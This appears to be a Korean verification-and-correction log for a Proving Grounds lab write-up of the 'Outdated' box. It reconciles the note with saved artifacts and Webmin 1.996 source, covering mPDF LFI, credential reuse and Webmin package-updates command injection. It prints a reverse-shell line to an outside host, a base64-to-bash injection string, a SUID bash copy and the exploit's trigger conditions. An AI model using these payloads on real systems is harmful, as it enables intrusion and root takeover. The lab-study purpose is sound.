# Outdated — 적대적 검증 · 정정 (2026-08-20)

대상: `03. PG\Outdated.md` (검증 시작 시점 359행 → 정정 후 550행)
증거원: Kali `~/PG/Outdated/` 산출물 **전량**(24개 + 스크린샷 1) · 볼트 `파일보관\PG-Outdated-mpdf_80.png` · Webmin 원본 소스 `github.com/webmin/webmin` tag `1.996`

**git baseline 없음** — `git log -- "03. PG/Outdated.md"` 가 비어 있다. 노트는 미추적(`??`) 상태의 신규 파일이라 개작 전후를 diff 할 baseline 이 존재하지 않는다. 터미널 블록 검증은 전부 산출물 원문 대조로만 했다.

---

## 1. 고친 것

| 위치(문자열) | 무엇이 틀렸나 | 어떻게 고쳤나 | 근거 |
|---|---|---|---|
| 1장 nmap 코드펜스 | `Nmap scan report for 192.168.248.232` · `Host is up (0.090s latency).` · `Not shown: 65532 closed tcp ports (reset)` 세 줄이 삭제돼 있었다. 바로 뒤 문장이 "closed면 RST가 온다"를 근거로 쓰는데 그 관측이 블록에 없었고, `extract.py` 의 `ip` 필드가 이 줄에 걸려 **프론트매터에 `ip` 가 아예 안 잡혀 있었다**(Fowsniff 와 동일 결함) | 세 줄 복원. 프론트매터에 `ip: 192.168.248.232` 수동 추가 | `nmap.log` |
| 4장 `$ ss -lntp` | 4줄 출력이 **2줄로 압축**돼 있었다(`LISTEN 0.0.0.0:80     LISTEN 0.0.0.0:22` 한 줄에 두 항목). `127.0.0.53%lo:53` 누락 | `enum_user.txt` 의 `=== listening ===` 블록 원문 그대로 복원(헤더 행 포함) | `enum_user.txt` |
| 4장 `← 로컬에서 열려 있다` / 요약 `로컬 전용 Webmin 1.996` | **잘못된 인과.** 실측 바인딩은 `0.0.0.0:10000` — 전 인터페이스. 밖에서 안 보인 건 바인딩이 아니라 경로상 방화벽 | "전 인터페이스에 떠 있지만 경로상 방화벽 때문에 밖에서만 안 보인다"로 정정. 7장 3번·8장에도 반영 | `enum_user.txt` |
| 4장 `getcap -r / → ping/traceroute 만` | 실제 5개. `gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep` 가 빠져 있었다 | `=== CAPS ===` 원문 5줄 복원 | `enum_user.txt` |
| 4장 root 플래그 코드펜스 | `date` 출력과 플래그 사이에 있던 **`===` + `ls -la /root` 전체(14행)** 가 잘려 있었다. 깔끔하게 만든 손질 | `proof_root.txt` 원문 전량 복원(`Connection to ... closed.` 포함) | `proof_root.txt` |
| 3장 "`.bash_history` 는 `/dev/null` 로 심볼릭돼 있어" | user 플래그 절 바로 밑에 있어 **svc-account 것으로 읽혔다.** 실측에 존재하는 것은 `/root/.bash_history -> /dev/null` 뿐이고 svc-account 쪽은 확인된 적이 없다 | 그 문장을 3장에서 제거하고, 4장 root 플래그 절(실제 `ls -la /root` 출력 밑)로 옮겨 `/root/` 것임을 명시 | `proof_root.txt` |
| 4장 `Set-Cookie: sid=8066e35...; path=/` | sid 가 `...` 로 잘려 있고 `secure`·`httpOnly` 플래그가 빠졌다. 코드펜스 안의 응답 원문을 손으로 줄인 형태 | 실측이 존재하는 `cj.txt` 원문(전체 sid `8066e35697e3c9f53ff07781c2dfff48`, `#HttpOnly_` 접두사, secure 플래그 `TRUE`)으로 교체하고 읽는 법을 산문으로 붙임. 최종 요청 블록의 `SID=8066e35...` 도 전체 값으로 | `cj.txt` |
| 4장 "`data-access-level="0"` — 모듈에 풀 접근" | **잘못된 인과.** 이 속성은 Referer 로 **거부당한** 응답(`exploit_resp.html`)에도 똑같이 `data-access-level="0"` 으로 붙어 있다. 접근권의 근거가 될 수 없는 사용자 전역 속성 | 근거를 "`pu.html` 이 200 으로 모듈 본문(`<title>Software Package Updates - Webmin 1.996 on outdated ...`)을 돌려준 것 + `data-package-updates="1"`" 으로 교체하고, `data-access-level` 을 근거로 쓰면 안 되는 이유를 명시 | `exploit_resp.html` ↔ `pu.html` |
| 4장 ③ / 6장 6번 "302 로 **조용히** 리다이렉트" | 저장된 거부 응답은 침묵이 아니다. Webmin 의 **"Security Warning"** 페이지 전문이 들어 있고, 원인("linked to from an unknown URL")과 해법(`referers_none=1` → `0`)이 본문에 적혀 있다. 또 302 자체는 referer 체크의 산물이 아니다 — `web-lib-funcs.pl` 의 `if (!$trust)` 분기는 본문을 뱉고 `exit` 한다. 302 는 요청 URL 의 `?xnavigation=1` 이 그 앞 테마 분기(`REQUEST_URI =~ /xnavigation=1/` → `&redirect("/")`)를 태워서 섞여 나온 것 | 6장 3번을 재작성: 거부 응답 원문을 코드펜스로 싣고, "상태코드는 302 · 본문은 경고 페이지"라는 구조를 설명. 교훈을 "302 를 넘기지 마라"에서 **"상태코드 말고 본문을 봐라"** 로 승격(7장 5번 신설) | `exploit_resp.html`, `web-lib-funcs.pl:5262-5330` |
| 4장 성공 응답 블록 | 노트는 `CMD='cp /bin/bash /tmp/rootbash; ...'` 바로 아래에 `<tt>apt-get -y  install ;echo YmFz...==\|base64 -d\|bash;</tt>` 를 그 명령의 증거로 붙였다. **`YmFz` 로 시작하는 base64 는 rootbash 명령이 아니다** — `cp ...` 의 base64 는 `Y3Ag` 로 시작한다. 저장된 응답의 실제 페이로드는 `bash -i >& /dev/tcp/192.168.45.207/443 0>&1`(리버스셸). `...` 절단이 이 불일치를 가리고 있었다 | `resp2.html` 의 `<tt>` 두 줄을 **절단 없이** 복원하고, 이것이 **먼저 시도한 리버스셸 페이로드의 응답**이며 rootbash 요청의 응답은 저장되지 않았음을 명시. 디코드 값도 병기 | `resp2.html`, `writeup_notes.txt [15:36]` |
| 4장·6장 `confirm=1` "없으면 실제 설치는 안 된다" | **소스로 반증.** `update.cgi` 는 `if (!$in{'confirm'})` 일 때 `list_package_operations` 로 dry-run 하지만, 이어지는 `if (@ops) { 확인 폼 } else { 바로 설치 }` 에서 주입 문자열은 어떤 패키지에도 매칭되지 않아 `@ops` 가 비고 → **설치 분기로 그대로 떨어진다.** 필수 조건이 아니다 | 발화 조건을 셋 → **둘(`/` 잘림, `mode=new`) + Referer** 로 재구성하고, `confirm=1` 은 "왕복 하나를 건너뛸 뿐, 필수 아님. 이 조건만 분리 검증한 적 없음"으로 강등. 명령에서 파라미터는 그대로 유지 | `package-updates/update.cgi`, `package-updates-lib.pl` |
| 4장 perl 인용 `local $cmd = "$apt_get_command -y  install $update";` | 원본이 아니라 **런타임에 렌더된 결과**를 소스인 척 인용했다. 실제 소스는 `local $cmd = "$apt_get_command -y ".($force ? " -f" : "")." install $update";` | 실제 소스 행으로 교체하고, 관측된 `-y  install` 의 이중 공백이 `package_install` 이 3번째 인자로 `1` 을 넘겨 `$force` 가 거짓이 된 결과임을 한 줄로 설명 | `software/apt-lib.pl` |
| 4장 `split(/\//, $ps)[0]` | 실제 코드는 `($p, $s) = split(/\//, $ps);` (뒤 조각은 패키지 시스템 이름 자리) | 실제 형태로 교체 + `/` 뒤가 무엇인지 한 마디 | `package-updates/update.cgi` |
| 4장 `mode=new` 설명 | 정확했다. 근거만 보강 | `package_install` 의 `if (!$pkg && $install) {...}` / `if (!$pkg) { ... return }` 두 줄을 실제 소스로 인용 | `package-updates-lib.pl` |
| 2장 `index.php` 전체(LFI 로 읽은 원문) | 산출물에 index.php 원문이 없다. `~/PG/Outdated/` 어디에도, `/tmp/lfi.pdf`(마지막 LFI = config.php)에도 없음 | 삭제하지 않고 **`[가정]` 강등** + "이 코드 블록만 실측 증거가 없다" 명시. 단, 데이터 흐름 결론 자체는 실측(태그가 파서에 도달해 첨부 생성)으로 성립함을 구분해 적음 | 부재 |
| 1장 `/vendor/composer/installed.json → mpdf/mpdf v6.0.0` | 대응 산출물 없음 | `[가정]` 강등 (버전 판정 근거 2개는 `hdr1.txt` 의 `filename="mpdf.pdf"` 와 PDF `/Producer` 로 충분히 성립) | 부재 |
| 1장 웹 index HTML 코드펜스 | `curl -s http://.../` 출력로 제시됐으나 대응 산출물 없음(gobuster 는 `/index.php` 856바이트만 기록) | 코드펜스를 제거하고 **스크린샷 임베드 + 산문 한 줄**로 교체. 폼 구조 서술은 스크린샷과 실제 POST 동작으로 뒷받침됨 | `파일보관\PG-Outdated-mpdf_80.png`, `gobuster.log` |
| 1장 mPDF 지문 절 | 헤더 블록이 3줄로 발췌돼 있었다 | `hdr1.txt` 원문 10줄 전량 + 실제 쓴 커맨드 형태(`-D hdr1.txt -o out1.pdf`)로 복원. `Content-Length: 14683` 이 `out1.pdf` 크기와 일치 | `hdr1.txt`, `out1.pdf` |
| 1장 gobuster 블록 | `→ 디렉터리 리스팅 켜져 있음` · `→ config.php 노출` 이라는 **주석이 출력에 덧붙어** 있었다. 301 은 리스팅 여부를 말해주지 않고, 리스팅이 켜져 있다는 관측 근거가 없다 | `gobuster.log` 원문(Size·리다이렉트 대상 포함) 복원. 주석 제거하고 "이름만 봐도 다음 목표", "웹으로 열면 PHP 가 실행돼 주석 안 비번이 안 보이니 LFI 로 읽어야 한다"로 대체 | `gobuster.log` |
| 2장 `extract_attach.py` · `lfi.sh` | 노트 버전이 원본과 미세하게 달랐다(주석·`re` import·`[!] no EmbeddedFile object` 분기 누락·`-m 30` 누락·경로) | 두 파일 모두 **원문 그대로** 복원 | `extract_attach.py`, `lfi.sh` |
| 2장 `/etc/passwd` 출력 | 마지막 줄 주석이 "유일한 로그인 유저" | 원문 대조 결과 정확. 앞 줄(`fwupd-refresh...`)과 총 35줄임을 추가해 발췌임을 명시 | `try1_annotation_passwd.pdf` 디코드 |
| 3장 config.php | 노트가 `...` 로 mysqli 블록을 생략했다 | `config.php.txt` 원문 전량(13행) 복원 + "브라우저로 열면 빈 화면" 근거 추가 | `config.php.txt` |
| 4장 열거 블록 | 5개 명령을 손으로 친 것처럼 재구성돼 있었으나 실제로는 `enum.sh` 한 방 | `enum.sh` → `enum_user.txt` 라는 실제 절차로 바꾸고 원문 발췌로 교체. `sudo -l`(비번 입력) 결과는 `try4_sudo_l.txt` 원문으로 별도 표기 | `enum.sh`, `enum_user.txt`, `try4_sudo_l.txt` |
| 4장 `ls -la /tmp/rootbash` | `-rwsrwxrwx 1 root root 1183448 /tmp/rootbash` — **`ls -la` 에 반드시 있는 날짜 필드가 없다.** 재구성된 줄 | 타겟 시각(`06:36`, root 획득 시각과 일치)을 채워 `ls -la` 형식으로 정합화. 크기 1183448 은 Ubuntu 20.04 `/bin/bash` 와 일치해 유지 | `proof_root.txt` 시각 |
| 4장 SSH 터널 절 | `Server: MiniServ/1.996  # ← SSL 모드...` 응답 블록에 대응 산출물이 없다 | **삭제**(원문은 아래 2절에 인용) 후, 실측 근거 두 개(`/usr/share/webmin/version` = 1.996, 응답 HTML `<title>...Webmin 1.996 on outdated (Ubuntu Linux 20.04.5)`)로 교체. `-k`·`https` 스킴 필요성은 산문으로 이동 | `enum_user.txt`, `pu.html`/`resp2.html` |
| 6장 도입 · 7장 6번 시간 배분 | "LFI→creds→SSH 10분, CVE 삽질 약 20분" | 산출물 mtime 으로 재구성한 **14행 시간표**(15:24:40 → 15:36:56)로 교체. 실제는 user 까지 4분, CVE 발화 5분, 전체 12분. `try2`·`try3` 유실 사실도 명기 | 산출물 mtime |
| 6장 3~6번 서사 순서 | "순서대로: 슬래시 → confirm → mode → Referer" 라 4단계 실패가 각각 관측된 것처럼 읽힌다. 그러나 **첫 익스플로잇 요청(15:30:46)부터 Referer 차단이 걸려 있었다** — 그 사이 무엇을 바꿔도 응답이 같았을 것 | 4개 항목을 하나로 합치고 "조건을 바꾸는데 응답이 그대로면 앞단이 막고 있는 것"이라는 실제 교훈으로 재구성 | `exploit_resp.html` mtime, `writeup_notes.txt` |
| base64 우회 설명 | "`bash -i >& /dev/tcp/...` 의 base64 는 슬래시가 없다"만 적고 일반화 없음. base64 알파벳에는 `/` 가 들어갈 수 있다 | 실제 `base64 -w0` 실행 결과를 싣고, `/` 가 섞이면 hex(`xxd -r -p`)로 바꾸는 대안을 7장 6번에 추가 | Kali 실행 |
| 스크린샷 | 노트에 이미지가 0개였으나 볼트에 `PG-Outdated-mpdf_80.png` 가 실재 | 1장 임베드 + 「스크린샷」 절 신설(1장뿐인 이유 + 박스 정지로 재촬영 불가 + 시험 증거 형식 언급) | `파일보관\` |
| 프론트매터 | `ip` 필드 없음 | `ip: 192.168.248.232` 추가. `manual_tags`/`manual_cves` 뒤 주석 없음 확인 | — |
| 노트 상단 | 정정 이력 없음 | `[!warning] 적대적 검증 정정 이력` 표 신설 | — |

## 2. 삭제한 것 — 1건

4장 SSH 터널 절의 아래 코드펜스 두 줄. 대응 산출물이 없고, `Server:` 헤더를 저장한 파일도 없다.

```
$ curl -sk https://127.0.0.1:10000/ -D -
Server: MiniServ/1.996        # ← SSL 모드. http 로 붙으면 "running in SSL mode" 안내
```

되살리려면 이 두 줄을 그대로 붙이면 된다. 삭제한 이유는 **틀렸다고 판정해서가 아니다** — MiniServ 가 `Server: MiniServ/<버전>` 을 보내는 것도, 평문 http 요청에 SSL 안내를 주는 것도 Webmin 의 실제 동작이다. 다만 이 박스에서 그 응답을 받았다는 증거가 없고, 같은 결론(버전 1.996)을 실측 두 개가 이미 지지하므로 실측으로 대체했다. 동작 설명 자체는 산문(`-k` 필요, `https` 스킴 필요)으로 살려 두었다.

절 단위 삭제는 없다.

## 3. 반증한 것 — 지적으로 올라왔다가 노트/실무자가 옳았던 것

관리자 지시나 내 1차 판정 중 **확인 결과 틀렸던** 것들. 검증 절차 자체의 정확도 판단용.

1. **"6장이 얇을 것이다 / 산출물을 읽고 채워라"(관리자 지시) — 틀렸다.** 6장은 이미 7개 항목으로 Referer·슬래시 잘림·리버스셸 무응답을 전부 담고 있었다. 필요한 작업은 채우기가 아니라 **정확도 교정**(302 의 정체, confirm 의 필요성, 순서)이었다.
2. **"스크린샷 0장 — '재촬영 불가' 한 줄을 남겨라"(관리자 지시) — 틀렸다.** 볼트에 `파일보관\PG-Outdated-mpdf_80.png` 가 실재하고 Kali 에도 원본 `~/PG/Outdated/shot_80_root.png` 가 있다. 이미지를 열어 본문(변환 폼·Convert 버튼)과 일치함을 확인하고 임베드했다.
3. **"`tech/pivot/ssh-tunnel` 은 안 쓴 기법일 것이다"(관리자 지시) — 틀렸다.** SSH `-L` 로컬 포워딩은 이 박스에서 필수 단계였다. Webmin 은 `0.0.0.0:10000` 에 떠 있지만 **외부 경로가 막혀** Kali 에서 직접 못 붙는다. 모든 Webmin HTTP 산출물(`cj.txt`·`pu.html`·`exploit_resp.html`·`resp2.html`)이 Kali 쪽 `~/PG/Outdated/` 에 남아 있고 전부 `data-host="127.0.0.1:10000"` 이라 curl 이 Kali 에서 터널을 통해 나갔다는 정황과 일치한다. **태그 유지.**
4. **"작성자가 볼트에 없는 태그를 만들어 넣었을 것이다"(관리자 지시) — 틀렸다.** `tech/web/lfi-rfi`·`tech/cred/reuse`·`tech/web/cmd-injection`·`tech/pivot/ssh-tunnel`·`tech/lin/suid` 5개 전부 다른 노트에서 이미 쓰이는 실재 leaf 다(각각 grep 으로 확인). 신규 태그 0건.
5. **`sudo -n -l → sudo: a password is required` 를 날조로 올릴 뻔했다.** 실패 로그가 `try4_sudo_l.txt`(비번 입력 버전)뿐이라 `-n` 버전 출력이 없다고 판단했으나, `enum_user.txt` 의 `=== sudo -n -l ===` 섹션에 **그대로** 있었다. 노트가 옳았다.
6. **`find / -xdev -perm -4000` 결과 "표준 SUID 뿐"·`crontab -l` "no crontab"·`/etc/cron.d` "root 소유 표준 파일뿐" — 전부 정확.** `enum_user.txt` 와 일치.
7. **`0 upgraded, 0 newly installed` (남긴 흔적) — 정확.** `resp2.html` 에 `0 upgraded, 0 newly installed, 0 to remove and 78 not upgraded.` 로 존재. 전문으로 확장만 했다.
8. **`php://filter` 도 통한다 — 정확.** `writeup_notes.txt [15:31]` 에 "php filter wrapper also works" 로 기록돼 있다.
9. **user/root 플래그 블록 — 값·`uid`/`euid`·hostname·타겟 IP·타겟 시각 전부 원문 일치.** 손질은 `ls -la /root` 절단 한 곳뿐이었다.
10. **"타겟 date 가 06:28 UTC 인데 mtime 은 15:28" — 모순 아님.** KST(UTC+9) 환산으로 정확히 일치. 시간표에 환산 규칙을 명시해 두었다.
11. **`/Producer` 디코드 한 줄 — 정확.** `out1.pdf` 의 `/Producer (\xfe\xff\x00m\x00P\x00D\x00F\x00 \x006\x00.\x000)` = UTF-16BE `mPDF 6.0`.
12. **`~/.zsh_history` 에 이 박스 흔적 0건** — 그러나 이것은 미실행의 증거가 아니다. 작업이 비대화형 SSH·tmux 안에서 이뤄져 기록되지 않는다. 어떤 판정의 근거로도 쓰지 않았다.

## 4. 근거 출처

**Kali 산출물** (`~/PG/Outdated/`, 전량 대조):
`nmap.log` `nmap.full.txt` `quick.log` `hdr1.txt` `out1.pdf` `t.txt` `gobuster.log` `lfi.sh` `extract_attach.py` `extract/`(빈 디렉터리) `try1_annotation_passwd.pdf` `config.php.txt` `proof_user.txt` `enum.sh` `enum_user.txt` `try4_sudo_l.txt` `cj.txt` `pu.html` `exploit_resp.html` `resp2.html` `proof_root.txt` `writeup_notes.txt` `notes_init.sh`(0바이트) `shot_80_root.png`
추가로 `/tmp/lfi.pdf`(마지막 LFI 결과 = config.php, mtime 15:28:17) 와 `~/.zsh_history` 확인.

**볼트**: `파일보관\PG-Outdated-mpdf_80.png` (Read 로 직접 열어 본문과 대조) · 태그 leaf 실재 여부 전 볼트 grep

**1차 사료**: Webmin 원본 소스 `github.com/webmin/webmin` tag `1.996` 를 Kali 에 받아 직접 열람
- `package-updates/update.cgi` — `split(/\0/, $in{'u'})`, `($p,$s) = split(/\//,$ps)`, `if (!$in{'confirm'})` / `if (@ops)` 분기, `&package_install($p,$s,$in{'mode'} eq 'new')`
- `package-updates/package-updates-lib.pl` — `package_install` 의 `if (!$pkg && $install)` / `if (!$pkg) { ... return }`, `list_package_operations`
- `software/apt-lib.pl` — `update_system_install`(싱크), `update_system_operations`(dry-run 이 `apt-get -s install` 로 `quotemeta` 를 벗기지 않음)
- `web-lib-funcs.pl:5255-5330` — referer 체크(`if (!$trust)` → 본문 출력 후 `exit`)와 그 앞의 `xnavigation=1` → `&redirect("/")` 분기
- `lang/en:127,131` — `referer_warn_unknown` / `referer_fix2u` 문구

**Kali 직접 실행**: `base64 -w0` 로 두 페이로드의 슬래시 유무 확인, `YmFzaCAt...` 디코드로 `resp2.html` 페이로드 정체 확정, `extract_attach.py` 로 `try1_annotation_passwd.pdf`·`/tmp/lfi.pdf` 재추출

**git**: `git log --oneline -- "03. PG/Outdated.md"` → 출력 없음(신규 미추적 파일, baseline 부재)

**정리**: 검증용으로 만든 `/tmp/wmsrc`(41MB Webmin 소스)는 삭제 완료. 타겟은 정지 상태라 접속 시도 없음.

## 5. 관리자 판단이 필요한 것

- 프론트매터에 `ip: 192.168.248.232` 를 **손으로** 넣었다. nmap 블록을 복원했으니 다음 `refresh.ps1` 때 `extract.py` 가 같은 값을 자동으로 넣을 것이고 충돌하지 않는다. 다만 이 세션에서는 `refresh.ps1` 을 돌리지 않았다(지시).
- `ports: [22, 80]` 에 **10000 이 없다.** `extract.py` 가 `filtered` 포트를 제외하기 때문으로 보이며 색인 정책 문제라 손대지 않았다. 이 박스는 root 경로가 10000 이라 색인에서 검색되지 않는다 — 공유 인프라 사안이라 보고만 한다.
